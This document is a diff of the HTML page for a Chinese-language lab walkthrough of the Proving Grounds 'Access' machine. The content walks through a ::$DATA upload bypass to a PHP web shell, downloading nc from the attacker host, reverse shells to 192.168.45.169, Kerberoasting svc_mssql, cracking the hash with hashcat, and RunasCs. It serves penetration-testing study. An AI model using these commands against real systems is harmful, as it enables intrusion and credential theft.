 <div class="highlight"><div class="chroma">
@@ -371,11 +315,10 @@
 </span></span><span class="line"><span class="cl">……
 </span></span><span class="line"><span class="cl"><span class="o">[</span>00:08:28<span class="o">]</span> <span class="m">301</span> -  344B  - /uploads  -&gt;  http://192.168.167.187/uploads/     
 </span></span><span class="line"><span class="cl"><span class="o">[</span>00:08:28<span class="o">]</span> <span class="m">403</span> -  304B  - /web.config::<span class="nv">$DATA</span>                                
-</span></span><span class="line"><span class="cl"><span class="o">[</span>00:08:29<span class="o">]</span> <span class="m">403</span> -  423B  - /webalizer
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>00:08:29<span class="o">]</span> <span class="m">403</span> -  423B  - /webalizer</span></span></code></pre></td></tr></table>
 </div>
 </div><p>尝试使用<code>::$DATA</code>进行文件上传绕过，成功。</p>
-<p><img loading="lazy" src="resource/14-W-M-Access.assets/image-20240112003822462.png" srcset="/posts/provinggrounds-access/resource/14-W-M-Access.assets/image-20240112003822462.png, resource/14-W-M-Access.assets/image-20240112003822462.png 1.5x, /posts/provinggrounds-access/resource/14-W-M-Access.assets/image-20240112003822462.png 2x" sizes="auto" data-title="image-20240112003822462" data-alt="image-20240112003822462" width="2240" height="1452" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+<p><img loading="lazy" src="/posts/provinggrounds-access/resource/14-W-M-Access.assets/image-20240112003822462.png" alt="image-20240112003822462" srcset="/posts/provinggrounds-access/resource/14-W-M-Access.assets/image-20240112003822462.png?size=small, /posts/provinggrounds-access/resource/14-W-M-Access.assets/image-20240112003822462.png?size=medium 1.5x, /posts/provinggrounds-access/resource/14-W-M-Access.assets/image-20240112003822462.png?size=large 2x" data-title="image-20240112003822462" style="--width: 2240px;--aspect-ratio: 2240 / 1452;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
@@ -449,8 +392,7 @@
 </span></span><span class="line"><span class="cl">Content-Disposition: form-data; name=&#34;submit&#34;
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">Purchase
-</span></span><span class="line"><span class="cl">-----------------------------29739589853663594743950605566--
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl">-----------------------------29739589853663594743950605566--</span></span></code></pre></td></tr></table>
 </div>
 </div><p>在uploads目录下找到所上传的文件，命令执行成功</p>
 <div class="highlight"><div class="chroma">
@@ -464,8 +406,7 @@
 <pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/OSCP/PG_Practice/Access<span class="o">]</span>
 </span></span><span class="line"><span class="cl">└─$ curl <span class="s2">&#34;http://192.168.167.187/uploads/test.PHP?cmd=whoami&#34;</span>           
 </span></span><span class="line"><span class="cl">123access<span class="se">\s</span>vc_apache
-</span></span><span class="line"><span class="cl">access<span class="se">\s</span>vc_apache 
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl">access<span class="se">\s</span>vc_apache </span></span></code></pre></td></tr></table>
 </div>
 </div><p>下载nc，并进行反弹shell</p>
 <div class="highlight"><div class="chroma">
@@ -479,8 +420,7 @@
 <pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="nv">cmd</span><span class="o">=</span>mkdir+C:<span class="se">\t</span>mp<span class="se">\
 </span></span></span><span class="line"><span class="cl"><span class="se"></span><span class="nv">cmd</span><span class="o">=</span>dir+C:<span class="se">\t</span>mp<span class="se">\
 </span></span></span><span class="line"><span class="cl"><span class="se"></span><span class="nv">cmd</span><span class="o">=</span>curl+http://192.168.45.169/nc64.exe+-o+C:<span class="se">\t</span>mp<span class="se">\n</span>c.exe
-</span></span><span class="line"><span class="cl"><span class="nv">cmd</span><span class="o">=</span>C:<span class="se">\t</span>mp<span class="se">\n</span>c.exe+192.168.45.169+443+-e+powershell
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl"><span class="nv">cmd</span><span class="o">=</span>C:<span class="se">\t</span>mp<span class="se">\n</span>c.exe+192.168.45.169+443+-e+powershell</span></span></code></pre></td></tr></table>
 </div>
 </div><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -507,11 +447,13 @@
 </span></span><span class="line"><span class="cl">PS C:<span class="se">\x</span>ampp<span class="se">\h</span>tdocs<span class="se">\u</span>ploads&gt; whoami
 </span></span><span class="line"><span class="cl">whoami
 </span></span><span class="line"><span class="cl">access<span class="se">\s</span>vc_apache
-</span></span><span class="line"><span class="cl">PS C:<span class="se">\x</span>ampp<span class="se">\h</span>tdocs<span class="se">\u</span>ploads&gt; 
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl">PS C:<span class="se">\x</span>ampp<span class="se">\h</span>tdocs<span class="se">\u</span>ploads&gt; </span></span></code></pre></td></tr></table>
 </div>
-</div><h2 id="prive">PrivE</h2>
-<p>上传工具</p>
+</div><h2 id="prive" class="heading-element"><span>PrivE</span>
+  <a href="#prive" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>上传工具</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -523,11 +465,13 @@
 <pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">PS C:<span class="se">\t</span>mp&gt; curl http://192.168.45.169/winPEASany.exe -o C:<span class="se">\t</span>mp<span class="se">\w</span>inPEASany.exe
 </span></span><span class="line"><span class="cl">PS C:<span class="se">\t</span>mp&gt; dir
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">PS C:<span class="se">\t</span>mp&gt; ./winPEASany.exe &gt; 1.txt
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl">PS C:<span class="se">\t</span>mp&gt; ./winPEASany.exe &gt; 1.txt</span></span></code></pre></td></tr></table>
 </div>
-</div><h3 id="spn">SPN</h3>
-<p>在当前用户下没有local.txt文件，注意到还有另一个svc_mssql账户</p>
+</div><h3 id="spn" class="heading-element"><span>SPN</span>
+  <a href="#spn" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>在当前用户下没有local.txt文件，注意到还有另一个svc_mssql账户</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -549,8 +493,7 @@
 </span></span><span class="line"><span class="cl">d-----        5/28/2021   3:53 AM                Administrator
 </span></span><span class="line"><span class="cl">d-r---        5/28/2021   3:53 AM                Public
 </span></span><span class="line"><span class="cl">d-----         4/8/2022   2:39 AM                svc_apache
-</span></span><span class="line"><span class="cl">d-----         4/8/2022   2:40 AM                svc_mssql
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl">d-----         4/8/2022   2:40 AM                svc_mssql</span></span></code></pre></td></tr></table>
 </div>
 </div><p>搜集SPN，测试过程中发现kali自带的empire下的get-spn.ps1无法实现效果，于是从网上找了一个脚本，地址：https://github.com/compwiz32/PowerShell/blob/master/Get-SPN.ps1</p>
 <div class="highlight"><div class="chroma">
@@ -606,8 +549,7 @@
 </span></span><span class="line"><span class="cl">		<span class="nv">$i</span><span class="p">+=</span><span class="mf">1</span>
 </span></span><span class="line"><span class="cl">	<span class="p">}</span>
 </span></span><span class="line"><span class="cl">	<span class="nb">Write-host</span> <span class="s2">&#34;&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>svc_mssql的SPN为 MSSQLSvc/DC.access.offsec</p>
 <div class="highlight"><div class="chroma">
@@ -699,11 +641,13 @@
 </span></span><span class="line"><span class="cl">servicePrincipalNames
 </span></span><span class="line"><span class="cl">SPN<span class="o">(</span> <span class="m">1</span> <span class="o">)</span>   <span class="o">=</span>       MSSQLSvc/DC.access.offsec
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">PS C:<span class="se">\t</span>mp&gt; 
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl">PS C:<span class="se">\t</span>mp&gt; </span></span></code></pre></td></tr></table>
 </div>
-</div><h3 id="ticket">Ticket</h3>
-<p>接下去获取<code>svc_mssql</code>的票据，使用如下命令将ticket存储在内存中：</p>
+</div><h3 id="ticket" class="heading-element"><span>Ticket</span>
+  <a href="#ticket" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>接下去获取<code>svc_mssql</code>的票据，使用如下命令将ticket存储在内存中：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
@@ -731,8 +675,7 @@
 </span></span><span class="line"><span class="cl">ValidFrom            : 1/11/2024 5:44:07 PM
 </span></span><span class="line"><span class="cl">ValidTo              : 1/12/2024 3:44:07 AM
 </span></span><span class="line"><span class="cl">ServicePrincipalName : MSSQLSvc/DC.access.offsec
-</span></span><span class="line"><span class="cl">SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl">SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey</span></span></code></pre></td></tr></table>
 </div>
 </div><p>利用Empire 的 Invoke-Kerberoast.ps1 导出内存中的Kerberoast hash</p>
 <div class="highlight"><div class="chroma">
@@ -802,12 +745,14 @@
 </span></span><span class="line"><span class="cl">81940B899A369EC5EC91804161EDA0B3E4BA39E7957A85027DB3825FA0AA490B74514
 </span></span><span class="line"><span class="cl">SamAccountName       : svc_mssql
 </span></span><span class="line"><span class="cl">DistinguishedName    : <span class="nv">CN</span><span class="o">=</span>MSSQL,CN<span class="o">=</span>Users,DC<span class="o">=</span>access,DC<span class="o">=</span>offsec
-</span></span><span class="line"><span class="cl">ServicePrincipalName : MSSQLSvc/DC.access.offsec
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl">ServicePrincipalName : MSSQLSvc/DC.access.offsec</span></span></code></pre></td></tr></table>
 </div>
-</div><p><img loading="lazy" src="resource/14-W-M-Access.assets/image-20240112015440644.png" srcset="/posts/provinggrounds-access/resource/14-W-M-Access.assets/image-20240112015440644.png, resource/14-W-M-Access.assets/image-20240112015440644.png 1.5x, /posts/provinggrounds-access/resource/14-W-M-Access.assets/image-20240112015440644.png 2x" sizes="auto" data-title="image-20240112015440644" data-alt="image-20240112015440644" width="2318" height="1112" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
-<h3 id="crack-hash">Crack Hash</h3>
-<p>整理hash格式写入文件</p>
+</div><p><img loading="lazy" src="/posts/provinggrounds-access/resource/14-W-M-Access.assets/image-20240112015440644.png" alt="image-20240112015440644" srcset="/posts/provinggrounds-access/resource/14-W-M-Access.assets/image-20240112015440644.png?size=small, /posts/provinggrounds-access/resource/14-W-M-Access.assets/image-20240112015440644.png?size=medium 1.5x, /posts/provinggrounds-access/resource/14-W-M-Access.assets/image-20240112015440644.png?size=large 2x" data-title="image-20240112015440644" style="--width: 2318px;--aspect-ratio: 2318 / 1112;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<h3 id="crack-hash" class="heading-element"><span>Crack Hash</span>
+  <a href="#crack-hash" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>整理hash格式写入文件</p>
 <p>使用hashcat进行破解</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -818,11 +763,13 @@
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/OSCP/PG_Practice/Access<span class="o">]</span>
 </span></span><span class="line"><span class="cl">└─$ hashcat -m <span class="m">13100</span> mssql.hash /usr/share/wordlists/rockyou.txt  --force -a <span class="m">0</span> --show
-</span></span><span class="line"><span class="cl"><span class="nv">$krb5tgs$23$*</span>svc_mssql<span class="nv">$access</span>.offsec<span class="nv">$MSSQLSvc</span>/DC.access.offsec*<span class="nv">$600077</span>adcf96e989d8c9a8d1ae325f08<span class="nv">$a0da4c8a4c76eb098a4567bbca91c9883eaa1f35c75428cee9f738d9044a5f0f41153b51832da55e14097c267ea14bf88a9861e14500a2e1e3d8e95269fd34fea33a40eff9658e40c8dadfdd868d17a49bdcd72575bbf060267b0f4f7617bff028165312f9d575f2189828715749cabd5ad9308d4be166a4b3b3736ecfec98367f0e43e93de1e498f86af3e8ab9b4463448467dcbd60e25b8051656976f5d1b9dfcb02d3fabc7b1578fec8570b4d606e6eadcc8a0ba80c9f2c1f2b395f46a2e98008b02b42dabef1800c3264b7be558ffff96fdc93d9133166124308c0cd7548827e217821ed41c05c1904665c711f9e21c964a98a94d2568ef863542259c31b36457d146b93faa8b682e48c49b1281c54d56051406869fe8683df28d38a5bd48503640abbeb4af5ddda28046377d80d8a018d38e50ec925fd845838efa60d34aa29e4bc1a1b0b54a8929546c9dc642866c34ed547590237a04de24e76d774467a7f42836c5ed87d9a50e0c7c225b7f107f16135ce4063507bc8b9da72ad45492fbfc6e37b946a0d66d109d4c41923d174b63f3ab9c41b2f8dfd814b0b01c9178b48c0c851fd623e8feab6fcc83bcf7358c87bf4d3caabf382dfb4e660116da8604cfd0c83847064df06cf15479583e7d108552e5e914dd6dbb12ca6ae6561b85f54a84ecbd92ca3c64ea8d27d80904e5fb0554b7fc04a3c49a237bb12d7d22d5384c1a7a7f81e1c8cc22a9c9c860f4f66d4f469fdd8d02752e547a604627ea2c1ce1110d7f4b5ba374df19e5cd003f7f9acebcd65346276503e304d98e952a2ace9586f012bdab4dab26a176a93b0f82ca65a7d39175dc2a9f14bd8b6b9079ae1324e0a64cf24539a616012773c0e3214c62366f1f4fe67508262dd9402db08a93b8485c3e61e843788517ad4b70a937667585493540ee55837097da324686ea8ae61daa9f6b4cb4aa98d2e870defeb33dd2bfbe0c7758e57eb3c10f08b67484339cb877c327b63a1d37e5fdfd947835bcbb3b24a742c64cf98316b20c14973a8a32c61a739e7b0c40d59777c2be502e79ac51571e9a1e3a8f9ac8bb8b024d742106656d1f4cba5d5c7db50d2efa204a50abc665f6bb86b1dc18f9a8c3e4f7413bfcb2b504f6c353709ce120885ad62a7a11f22d2f4b95a7b2d8ade89f25a344ce6e85b4a1e33072d43a7838a25dcbffc7110e559c15d54c39bc4bd287387ac4099bf18d926cd464f9a4f2927da5944360a8ecb1cc5998af1017554e58cce2e1bedbd4a0bc4deaeb97f914ba05b184d522aca5fa8fef3f5dac9d71c1e0c7a8e72ad7d98c114c156a05d695ac5cdbefad407bb65fbfe8955e58c4de0519ebba102f46241bd2c3ee053ff2e5d78493cdf75cc113cf3fc3a72e0b22f24d9845385a8613c5e30da408d7095806607ebd04797bf7fe35eb5af096b0a144d92b103c9fb30f150c2eefac49737debf38b781822e39409bcff12657f2e1cfdb0da7168efa2dd9cb42d6694c4ff65aec36e529e4dd06e66384e7aef3af37a9f45dc9dcc99c57f5e94a36661517037fbc81fef7281940b899a369ec5ec91804161eda0b3e4ba39e7957a85027db3825fa0aa490b74514</span>:trustno1
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl"><span class="nv">$krb5tgs$23$*</span>svc_mssql<span class="nv">$access</span>.offsec<span class="nv">$MSSQLSvc</span>/DC.access.offsec*<span class="nv">$600077</span>adcf96e989d8c9a8d1ae325f08<span class="nv">$a0da4c8a4c76eb098a4567bbca91c9883eaa1f35c75428cee9f738d9044a5f0f41153b51832da55e14097c267ea14bf88a9861e14500a2e1e3d8e95269fd34fea33a40eff9658e40c8dadfdd868d17a49bdcd72575bbf060267b0f4f7617bff028165312f9d575f2189828715749cabd5ad9308d4be166a4b3b3736ecfec98367f0e43e93de1e498f86af3e8ab9b4463448467dcbd60e25b8051656976f5d1b9dfcb02d3fabc7b1578fec8570b4d606e6eadcc8a0ba80c9f2c1f2b395f46a2e98008b02b42dabef1800c3264b7be558ffff96fdc93d9133166124308c0cd7548827e217821ed41c05c1904665c711f9e21c964a98a94d2568ef863542259c31b36457d146b93faa8b682e48c49b1281c54d56051406869fe8683df28d38a5bd48503640abbeb4af5ddda28046377d80d8a018d38e50ec925fd845838efa60d34aa29e4bc1a1b0b54a8929546c9dc642866c34ed547590237a04de24e76d774467a7f42836c5ed87d9a50e0c7c225b7f107f16135ce4063507bc8b9da72ad45492fbfc6e37b946a0d66d109d4c41923d174b63f3ab9c41b2f8dfd814b0b01c9178b48c0c851fd623e8feab6fcc83bcf7358c87bf4d3caabf382dfb4e660116da8604cfd0c83847064df06cf15479583e7d108552e5e914dd6dbb12ca6ae6561b85f54a84ecbd92ca3c64ea8d27d80904e5fb0554b7fc04a3c49a237bb12d7d22d5384c1a7a7f81e1c8cc22a9c9c860f4f66d4f469fdd8d02752e547a604627ea2c1ce1110d7f4b5ba374df19e5cd003f7f9acebcd65346276503e304d98e952a2ace9586f012bdab4dab26a176a93b0f82ca65a7d39175dc2a9f14bd8b6b9079ae1324e0a64cf24539a616012773c0e3214c62366f1f4fe67508262dd9402db08a93b8485c3e61e843788517ad4b70a937667585493540ee55837097da324686ea8ae61daa9f6b4cb4aa98d2e870defeb33dd2bfbe0c7758e57eb3c10f08b67484339cb877c327b63a1d37e5fdfd947835bcbb3b24a742c64cf98316b20c14973a8a32c61a739e7b0c40d59777c2be502e79ac51571e9a1e3a8f9ac8bb8b024d742106656d1f4cba5d5c7db50d2efa204a50abc665f6bb86b1dc18f9a8c3e4f7413bfcb2b504f6c353709ce120885ad62a7a11f22d2f4b95a7b2d8ade89f25a344ce6e85b4a1e33072d43a7838a25dcbffc7110e559c15d54c39bc4bd287387ac4099bf18d926cd464f9a4f2927da5944360a8ecb1cc5998af1017554e58cce2e1bedbd4a0bc4deaeb97f914ba05b184d522aca5fa8fef3f5dac9d71c1e0c7a8e72ad7d98c114c156a05d695ac5cdbefad407bb65fbfe8955e58c4de0519ebba102f46241bd2c3ee053ff2e5d78493cdf75cc113cf3fc3a72e0b22f24d9845385a8613c5e30da408d7095806607ebd04797bf7fe35eb5af096b0a144d92b103c9fb30f150c2eefac49737debf38b781822e39409bcff12657f2e1cfdb0da7168efa2dd9cb42d6694c4ff65aec36e529e4dd06e66384e7aef3af37a9f45dc9dcc99c57f5e94a36661517037fbc81fef7281940b899a369ec5ec91804161eda0b3e4ba39e7957a85027db3825fa0aa490b74514</span>:trustno1</span></span></code></pre></td></tr></table>
 </div>
-</div><h3 id="runascs">RunasCs</h3>
-<p>接下去需要获取mssql身份的反弹shell，可以使用&quot;<a href="https://github.com/antonioCoco/RunasCs/blob/master/Invoke-RunasCs.ps1"target="_blank" rel="external nofollow noopener noreferrer">Invoke-RunasCs.ps1</a>&ldquo;这个脚本</p>
+</div><h3 id="runascs" class="heading-element"><span>RunasCs</span>
+  <a href="#runascs" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>接下去需要获取mssql身份的反弹shell，可以使用&quot;<a href="https://github.com/antonioCoco/RunasCs/blob/master/Invoke-RunasCs.ps1"target="_blank" rel="external nofollow noopener noreferrer">Invoke-RunasCs.ps1</a>&ldquo;这个脚本</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
@@ -882,10 +829,9 @@
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">PS C:<span class="se">\t</span>mp&gt; Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command <span class="s2">&#34;C:\tmp\nc.exe 192.168.45.169 7777 -e powershell&#34;</span>
 </span></span><span class="line"><span class="cl">Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command <span class="s2">&#34;C:\tmp\nc.exe 192.168.45.169 7777 -e powershell&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Warning: The logon <span class="k">for</span> user <span class="s1">&#39;svc_mssql&#39;</span> is limited. Use the flag combination --bypass-uac and --logon-type <span class="s1">&#39;8&#39;</span> to obtain a more privileged token.
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Warning: The logon <span class="k">for</span> user <span class="s1">&#39;svc_mssql&#39;</span> is limited. Use the flag combination --bypass-uac and --logon-type <span class="s1">&#39;8&#39;</span> to obtain a more privileged token.</span></span></code></pre></td></tr></table>
 </div>
-</div><p><img loading="lazy" src="resource/14-W-M-Access.assets/image-20240112021350288.png" srcset="/posts/provinggrounds-access/resource/14-W-M-Access.assets/image-20240112021350288.png, resource/14-W-M-Access.assets/image-20240112021350288.png 1.5x, /posts/provinggrounds-access/resource/14-W-M-Access.assets/image-20240112021350288.png 2x" sizes="auto" data-title="image-20240112021350288" data-alt="image-20240112021350288" width="1624" height="1070" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+</div><p><img loading="lazy" src="/posts/provinggrounds-access/resource/14-W-M-Access.assets/image-20240112021350288.png" alt="image-20240112021350288" srcset="/posts/provinggrounds-access/resource/14-W-M-Access.assets/image-20240112021350288.png?size=small, /posts/provinggrounds-access/resource/14-W-M-Access.assets/image-20240112021350288.png?size=medium 1.5x, /posts/provinggrounds-access/resource/14-W-M-Access.assets/image-20240112021350288.png?size=large 2x" data-title="image-20240112021350288" style="--width: 1624px;--aspect-ratio: 1624 / 1070;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -899,11 +845,13 @@
 </span></span></span><span class="line"><span class="cl"><span class="se"></span><span class="nb">cd</span> C:<span class="se">\u</span>sers<span class="se">\s</span>vc_mssql<span class="se">\D</span>esktop<span class="se">\
 </span></span></span><span class="line"><span class="cl"><span class="se"></span>PS C:<span class="se">\u</span>sers<span class="se">\s</span>vc_mssql<span class="se">\D</span>esktop&gt; cat local.txt
 </span></span><span class="line"><span class="cl">cat local.txt
-</span></span><span class="line"><span class="cl">ac7cd92298a3ec65de98ea4c51f9e95e
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl">ac7cd92298a3ec65de98ea4c51f9e95e</span></span></code></pre></td></tr></table>
 </div>
-</div><h2 id="prive-1">PrivE</h2>
-<p>再次进行信息搜集</p>
+</div><h2 id="prive-1" class="heading-element"><span>PrivE</span>
+  <a href="#prive-1" class="heading-mark">
